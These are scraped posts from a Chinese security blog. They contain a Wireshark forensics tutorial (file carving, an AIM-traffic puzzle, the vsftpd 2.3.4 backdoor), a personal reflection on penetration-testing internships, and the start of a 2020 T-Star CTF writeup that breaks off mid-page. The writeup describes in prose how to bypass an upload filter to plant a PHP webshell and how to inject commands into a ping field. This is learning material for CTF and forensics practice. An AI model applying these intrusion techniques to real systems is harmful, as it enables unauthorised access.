安全防御</h4><p>防火墙</p><ul><li>限流: 将链路中的UDP报文控制在合理的范围，当超过指定值，则丢弃UDP报文</li><li>指纹学习: 先学习，在匹配</li></ul><h3 id="网络取证简析"><a href="#网络取证简析" class="headerlink" title="网络取证简析"></a>网络取证简析</h3><h4 id="wireshark-恢复传输文件"><a href="#wireshark-恢复传输文件" class="headerlink" title="wireshark 恢复传输文件"></a>wireshark 恢复传输文件</h4><p>无论使用何种应用层协议，对于传输层来说都是TCP或UDP协议，来恢复一下wireshark官网提供的文件<br><a href="https://wiki.wireshark.org/SampleCaptures?action=AttachFile&do=view&target=http_with_jpegs.cap.gz">https://wiki.wireshark.org/SampleCaptures?action=AttachFile&amp;do=view&amp;target=http_with_jpegs.cap.gz</a><br><a href="https://www.yuque.com/attachments/yuque/0/2020/gz/2789727/1605840476295-da677716-cade-446a-9ad6-7b5cd60564d5.gz?_lake_card=%7B%22uid%22:%221605840475936-0%22,%22src%22:%22https://www.yuque.com/attachments/yuque/0/2020/gz/2789727/1605840476295-da677716-cade-446a-9ad6-7b5cd60564d5.gz%22,%22name%22:%22http_with_jpegs.cap.gz%22,%22size%22:261947,%22type%22:%22application/x-gzip%22,%22ext%22:%22gz%22,%22progress%22:%7B%22percent%22:99%7D,%22status%22:%22done%22,%22percent%22:0,%22id%22:%22jhjjK%22,%22card%22:%22file%22%7D">http_with_jpegs.cap.gz</a></p><p>首先在显示过滤器中筛选具有jpeg内容的数据包: <code>http contains &quot;jpeg&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605840700672-307192b2-795c-44f9-acb5-6767a5d42d25.png#align=left&display=inline&height=343&margin=%5Bobject%20Object%5D&name=image.png&originHeight=686&originWidth=2212&size=291904&status=done&style=none&width=1106" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605840700672-307192b2-795c-44f9-acb5-6767a5d42d25.png#align=left&display=inline&height=343&margin=%5Bobject%20Object%5D&name=image.png&originHeight=686&originWidth=2212&size=291904&status=done&style=none&width=1106" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>选第一个，追踪tcp流<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841239748-c5db8b2a-ec6e-47bf-88b1-99de7e7c3c32.png#align=left&display=inline&height=561&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1122&originWidth=1936&size=546540&status=done&style=none&width=968" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841239748-c5db8b2a-ec6e-47bf-88b1-99de7e7c3c32.png#align=left&display=inline&height=561&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1122&originWidth=1936&size=546540&status=done&style=none&width=968" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841334136-f96a6202-6552-4285-bb72-ab952c06e7f3.png#align=left&display=inline&height=792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1584&originWidth=1540&size=557977&status=done&style=none&width=770" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841334136-f96a6202-6552-4285-bb72-ab952c06e7f3.png#align=left&display=inline&height=792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1584&originWidth=1540&size=557977&status=done&style=none&width=770" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>最后点一下 Save as… 保存为 xxx.bin 就好，然后用16进制编辑器打开，JPEG的文件开始字节为 <code>FF D8</code>，文件结束字节为 <code>FF D9</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841552240-181bfa3f-e3d5-4362-b799-f327fb66fa23.png#align=left&display=inline&height=506&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1012&originWidth=1540&size=345491&status=done&style=none&width=770" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841552240-181bfa3f-e3d5-4362-b799-f327fb66fa23.png#align=left&display=inline&height=506&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1012&originWidth=1540&size=345491&status=done&style=none&width=770" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>然后把其余没用的都删除掉，这里因为结束符号就是最后了，因此把上图 <code>FF D8</code> 之前的都删除掉就好了。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841622742-4b8536ae-007b-4b11-a12c-163fd7fc896c.png#align=left&display=inline&height=394&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=1584&size=394632&status=done&style=none&width=792" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841622742-4b8536ae-007b-4b11-a12c-163fd7fc896c.png#align=left&display=inline&height=394&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=1584&size=394632&status=done&style=none&width=792" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841661621-38e7cf54-e921-4853-a5a8-3fc07c000734.png#align=left&display=inline&height=593&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1186&originWidth=1444&size=1359525&status=done&style=none&width=722" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841661621-38e7cf54-e921-4853-a5a8-3fc07c000734.png#align=left&display=inline&height=593&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1186&originWidth=1444&size=1359525&status=done&style=none&width=722" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>成功恢复。</p><h4 id="取证实践案例"><a href="#取证实践案例" class="headerlink" title="取证实践案例"></a>取证实践案例</h4><p><a href="https://forensicscontest.com/2009/09/25/puzzle-1-anns-bad-aim">https://forensicscontest.com/2009/09/25/puzzle-1-anns-bad-aim</a><br>好像没了。。。然后在Github找了个: <a href="https://github.com/aarud/Pcaps/blob/master/evidence01.pcap">https://github.com/aarud/Pcaps/blob/master/evidence01.pcap</a></p><h5 id="1-寻找Ann的通信好友名称"><a href="#1-寻找Ann的通信好友名称" class="headerlink" title="1.寻找Ann的通信好友名称"></a>1.寻找Ann的通信好友名称</h5><p>根据题目名称提示 aim 通信，wireshark 自带 aim 解密<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772208918-064aee2d-3b2b-4ed9-9f43-d654d1237f56.png#align=left&display=inline&height=381&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=1042&size=277791&status=done&style=none&width=521" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772208918-064aee2d-3b2b-4ed9-9f43-d654d1237f56.png#align=left&display=inline&height=381&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=1042&size=277791&status=done&style=none&width=521" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>这三项依次改为<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772589738-830ff49d-bc78-46db-8c3e-0065aef1936e.png#align=left&display=inline&height=80&margin=%5Bobject%20Object%5D&name=image.png&originHeight=160&originWidth=942&size=33306&status=done&style=none&width=471" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772589738-830ff49d-bc78-46db-8c3e-0065aef1936e.png#align=left&display=inline&height=80&margin=%5Bobject%20Object%5D&name=image.png&originHeight=160&originWidth=942&size=33306&status=done&style=none&width=471" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>然后查看数据包，发现通信好友名称是 Sec558user1<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772717050-166452db-d6d3-481c-a31a-4f09dc457427.png#align=left&display=inline&height=435&margin=%5Bobject%20Object%5D&name=image.png&originHeight=870&originWidth=1680&size=214193&status=done&style=none&width=840" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772717050-166452db-d6d3-481c-a31a-4f09dc457427.png#align=left&display=inline&height=435&margin=%5Bobject%20Object%5D&name=image.png&originHeight=870&originWidth=1680&size=214193&status=done&style=none&width=840" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h5 id="2-通信过程中的第一条信息内容是什么"><a href="#2-通信过程中的第一条信息内容是什么" class="headerlink" title="2. 通信过程中的第一条信息内容是什么"></a>2. 通信过程中的第一条信息内容是什么</h5><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773224776-cf54fa2e-3d3d-42d5-8e46-89aa0bcd5fac.png#align=left&display=inline&height=377&margin=%5Bobject%20Object%5D&name=image.png&originHeight=754&originWidth=2166&size=186028&status=done&style=none&width=1083" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773224776-cf54fa2e-3d3d-42d5-8e46-89aa0bcd5fac.png#align=left&display=inline&height=377&margin=%5Bobject%20Object%5D&name=image.png&originHeight=754&originWidth=2166&size=186028&status=done&style=none&width=1083" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h5 id="3-Ann-通信过程中传输的文件名字"><a href="#3-Ann-通信过程中传输的文件名字" class="headerlink" title="3. Ann 通信过程中传输的文件名字"></a>3. Ann 通信过程中传输的文件名字</h5><p>显示过滤器输入 <code>data</code>，然后追踪tcp流<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773343192-020ba75d-966c-4c61-b195-943db2f8f8be.png#align=left&display=inline&height=352&margin=%5Bobject%20Object%5D&name=image.png&originHeight=704&originWidth=2226&size=395317&status=done&style=none&width=1113" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773343192-020ba75d-966c-4c61-b195-943db2f8f8be.png#align=left&display=inline&height=352&margin=%5Bobject%20Object%5D&name=image.png&originHeight=704&originWidth=2226&size=395317&status=done&style=none&width=1113" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>文件名字<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773432291-4151f4a5-d07b-425a-acd4-fc96474e1da9.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=image.png&originHeight=434&originWidth=1502&size=71877&status=done&style=none&width=751" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773432291-4151f4a5-d07b-425a-acd4-fc96474e1da9.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=image.png&originHeight=434&originWidth=1502&size=71877&status=done&style=none&width=751" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h5 id="4-还原Ann发送文件并得出文件幻数（magic-number）"><a href="#4-还原Ann发送文件并得出文件幻数（magic-number）" class="headerlink" title="4. 还原Ann发送文件并得出文件幻数（magic number）"></a>4. 还原Ann发送文件并得出文件幻数（magic number）</h5><p>文件幻数介绍: <a href="https://baike.baidu.com/item/magic%20number">https://baike.baidu.com/item/magic%20number</a><br>说直白点就是以 zip 之父的首字母PK来命名，对应的16进制是<code>50 4B 03 04</code><br>50(P)4B(K)03(文本结束)04(传输结束)，组合起来就是压缩包的标识开头。<br>那为啥word文档的文件开头是这个，把word文档后缀改为<code>.zip</code>试试，这是微软2006年公布的OOXML规范。</p><p>显示过滤器输入 <code>data</code>，然后追踪tcp流<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775150674-da5faf1e-18e0-402e-8a03-3aacf9cc1659.png#align=left&display=inline&height=792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1584&originWidth=1540&size=355286&status=done&style=none&width=770" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775150674-da5faf1e-18e0-402e-8a03-3aacf9cc1659.png#align=left&display=inline&height=792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1584&originWidth=1540&size=355286&status=done&style=none&width=770" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>另存为，<code>xxx.bin</code>，用16进制编辑器打开<code>xxx.bin</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775249230-11f41003-6bde-4b41-9440-4d6d0f6e3c7f.png#align=left&display=inline&height=308&margin=%5Bobject%20Object%5D&name=image.png&originHeight=616&originWidth=1104&size=136063&status=done&style=none&width=552" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775249230-11f41003-6bde-4b41-9440-4d6d0f6e3c7f.png#align=left&display=inline&height=308&margin=%5Bobject%20Object%5D&name=image.png&originHeight=616&originWidth=1104&size=136063&status=done&style=none&width=552" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775265569-bae777a6-9d33-4590-b856-bd850b64028f.png#align=left&display=inline&height=420&margin=%5Bobject%20Object%5D&name=image.png&originHeight=840&originWidth=1418&size=206237&status=done&style=none&width=709" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775265569-bae777a6-9d33-4590-b856-bd850b64028f.png#align=left&display=inline&height=420&margin=%5Bobject%20Object%5D&name=image.png&originHeight=840&originWidth=1418&size=206237&status=done&style=none&width=709" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775368576-d7466692-61fe-442a-b55a-894a35e087ff.png#align=left&display=inline&height=572&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1144&originWidth=2500&size=275400&status=done&style=none&width=1250" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775368576-d7466692-61fe-442a-b55a-894a35e087ff.png#align=left&display=inline&height=572&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1144&originWidth=2500&size=275400&status=done&style=none&width=1250" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h5 id="5-查看文件md5值"><a href="#5-查看文件md5值" class="headerlink" title="5. 查看文件md5值"></a>5. 查看文件md5值</h5><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605776173099-e81a08f3-c739-4125-a673-7fe95fcc8ae8.png#align=left&display=inline&height=57&margin=%5Bobject%20Object%5D&name=image.png&originHeight=114&originWidth=762&size=57516&status=done&style=none&width=381" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605776173099-e81a08f3-c739-4125-a673-7fe95fcc8ae8.png#align=left&display=inline&height=57&margin=%5Bobject%20Object%5D&name=image.png&originHeight=114&originWidth=762&size=57516&status=done&style=none&width=381" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="应用层网络安全"><a href="#应用层网络安全" class="headerlink" title="应用层网络安全"></a>应用层网络安全</h2><h3 id="暴力破解分析"><a href="#暴力破解分析" class="headerlink" title="暴力破解分析"></a>暴力破解分析</h3><p>分析使用 medusa 破解 ssh 登录<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605842165858-a47b2bfd-424f-4bb1-9ccd-251d6bc24d51.png#align=left&display=inline&height=459&margin=%5Bobject%20Object%5D&name=image.png&originHeight=918&originWidth=1784&size=1844097&status=done&style=none&width=892" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605842165858-a47b2bfd-424f-4bb1-9ccd-251d6bc24d51.png#align=left&display=inline&height=459&margin=%5Bobject%20Object%5D&name=image.png&originHeight=918&originWidth=1784&size=1844097&status=done&style=none&width=892" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h3 id="后门分析"><a href="#后门分析" class="headerlink" title="后门分析"></a>后门分析</h3><p>某些软件具有其他的目的 -&gt; 设置隐藏后门<br>这里针对vsftpd 2.3.4 后门<br>帐号密码不要紧，有 <code>:)</code> 笑脸就行，因此这个后门也被称为笑脸后门，2333<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605842408016-3afe8bd9-95c9-4f40-bf85-6ea21bdee091.png#align=left&display=inline&height=546&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1092&originWidth=1916&size=714363&status=done&style=none&width=958" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605842408016-3afe8bd9-95c9-4f40-bf85-6ea21bdee091.png#align=left&display=inline&height=546&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1092&originWidth=1916&size=714363&status=done&style=none&width=958" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 流量分析 </category>
          
          <category> Wireshark </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
            <tag> Wireshark </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>=======总结 &amp; 手动分割线=======</title>
      <link href="//p/2021/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/"/>
      <url>//p/2021/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<p>由于 <a href="https://www.notion.so/">notion</a> 和 <a href="https://www.yuque.com/">语雀</a> 使用起来过于舒适，差点忘了自己还有个博客，直到 （逃</p><p><img src="/img/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/image-20210401190333056.png" class="lazyload" data-srcset="/img/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/image-20210401190333056.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210401190333056"></p><p>上次写博客还是大三上学期末，现在都差不多要毕业了。大二大三那会，在学校啥都干，从之前的文章也能看出，服务器运维、开发、CTF….</p><p>顺便做个总结，这一年虽没写博客，不过找了两份实习，一个是做渗透测试、一个是安全攻防研究，还有学校各种各样的事情，好像上次跑 <code>hexo d</code> 还是不久之前（主要是被 notion 和 语雀 惯懒了）…</p><ul><li>2020.4 - 2020.10 渗透测试实习生，算是正式入门网安吧…感谢组内大佬肯收留我个菜鸡，哈哈，一开始还很纠结，以后是做安全还是运维，所以各投了一份实习（刚过完年做师兄的疯狂安利下），面试和准备，发现还是对网安更敢兴趣一些~，所以选了网安。不过现在偶尔会想，要是当初我选了另外一个实习，现在会怎样？（毕竟两边面试都过了），实习过程中被各种带飞，认识了几个大佬，其中的项目经验，都给秋招打下了基础。</li></ul><ul><li>2020.10 - 2020.12 学校项目，模仿大佬的开源项目，结合深度学习和网安和同学一起做了个《基于A2C和MSF的自适应渗透测试工具》，作为代码和文档的主要贡献者，虽然没做到想象中效果，不过也是第一次尝试去学习和改动大佬的开源项目。虽然功能上没能做的很好（不过还是做了许多的不错的优化），但是以后对开源项目都不会有那种陌生的隔离感了（就这个语言学过，也写过项目，但看着大佬写的就是有点抽象）</li></ul><ul><li>2020.11 - 2021.3 安全攻防研究实习生，第一次在大型项目中技术上承担一定角色，挑战很大，过了一个月才习惯这些工作，之前实习主要是渗透，这次还有很多代码审计、尤其是hvv相关的，代码审计任务很繁重，平均一天要审个6000+行代码（而且还是各种语言，有的压根就不怎么熟悉…）。也做了很多尝试，比如威胁建模评审，安全红线落实等，也是第一次接触SDL，也由此知道为啥大厂核心业务漏洞会难挖，毕竟别人都有做SDL流程。当然除此之外，由于我们部门很看重产出，所以这次实习也没上次实习那么轻松。特别是我这个产品线，迭代了很多代，漏洞特别难挖，而且渗透也比较麻烦，因为环境比较复杂，没有在搞站那会随随便便抓个包改改参数那么舒服了~ 当然产出不仅仅是挖洞，还可以有安全研究分享，输出文档等等等等~</li></ul><p>总之就是从之前各种打杂到现在会稍微专注于一个方向，所以成长也挺快的，虽然还是很菜（x，其实主要还是被各种大佬带飞，少走了一些坑 （</p><p>今年，虽然过年很久了，先立一些 flag 吧~，毕竟实习了两次，发现一些东西需要补补了</p><ul><li>SDL，把实习学的做个总结并做一些拓展</li><li>云安全，先把威胁建模学个差不多，然后熟悉一波主流的云基础框架，毕竟工作要用到</li><li>二进制，常见漏洞点和利用方式要掌握，感觉熟悉二进制以后审计C/C++会舒服不少</li><li>代码审计，把白嫖过来的CTFSHOW入门大部分给刷完，巩固一波基础~</li></ul><p>迟些会把一些正常点的笔记放上来，2333</p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
          <category> 小记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小记 </tag>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020腾讯犀牛鸟网络安全T-Star高校挑战赛Writeup</title>
      <link href="//p/2020/2020T-Star-ctf/"/>
      <url>//p/2020/2020T-Star-ctf/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-签到"><a href="#0x01-签到" class="headerlink" title="0x01 签到"></a>0x01 签到</h2><p>打开题目链接，由HTTP请求头可知使用PHP，先把PHP的webshell改名为jpg，然后根据题目提示使用burp抓包绕过前端js验证，把后缀名改回php。</p><p><img src="/img/2020T-Star-ctf/image-20221012085948006.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012085948006.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012085948006"></p><p>通过查看网页源码得知上传webshell的路径，通过冰蝎连上，在/var/www/key发现flag，key{K735c9f0D7ddc3b9}，如下图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012085956515.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012085956515.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012085956515"></p><h2 id="0x02-命令执行基础"><a href="#0x02-命令执行基础" class="headerlink" title="0x02 命令执行基础"></a>0x02 命令执行基础</h2><p>ping命令执行题，先随便ping一下本机能成功执行命令，然后发现使用分号分割发现执行命令没有回显，于是用管道符把原有输出给覆盖掉，ls发现可以正常当前目录，然后ls .. 发现flag在key.php里，如下图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090019078.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090019078.png" 